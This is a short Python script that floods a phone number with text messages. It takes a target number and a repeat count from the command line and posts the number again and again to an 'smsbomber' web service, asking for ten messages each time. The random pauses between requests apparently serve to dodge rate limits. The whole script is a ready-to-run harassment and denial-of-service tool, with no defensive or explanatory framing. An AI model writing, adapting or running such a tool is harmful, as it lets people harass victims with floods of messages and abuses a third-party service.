import requests
import sys
import time
import random

urll = "https://www.smsbomber.online/index.php"
DATA = {'number':sys.argv[1],'count':10,'submit':'Submit'}

def bomb():
    r=requests.post(url = urll, data = DATA)

for i in range(int(sys.argv[2])):
    time.sleep(random.randint(5, 20))
    print(i)
    bomb()
